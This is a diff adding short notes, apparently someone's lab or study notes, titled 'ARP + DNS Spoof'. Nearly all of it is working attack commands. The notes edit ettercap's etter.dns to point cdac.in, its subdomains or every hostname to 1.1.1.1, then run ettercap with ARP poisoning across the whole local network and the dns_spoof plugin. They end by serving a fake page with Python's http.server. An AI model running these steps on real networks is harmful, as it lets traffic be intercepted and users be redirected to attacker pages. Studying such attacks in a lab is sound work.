@@ -1,0 +1,28 @@
+ARP + DNS Spoof
+```````````````
+# vim /etc/ettercap/etter.dns
+
+cdac.in		A 		1.1.1.1
+		OR
+.cdac.in		A 		1.1.1.1
+		OR
+*		A 		1.1.1.1	
+
+:wq
+
+
+
+# ettercap -i eth0 -TqM ARP /// /// -P dns_spoof
+
+-P : Plugin
+
+
+
+Host a fake webpage:
+````````````````````
+# mkdir lol
+# cd lol/
+# cat > index.html
+<h1>LOL</h1>
+
+# python3 -m http.server --bind x.x.x.x 80
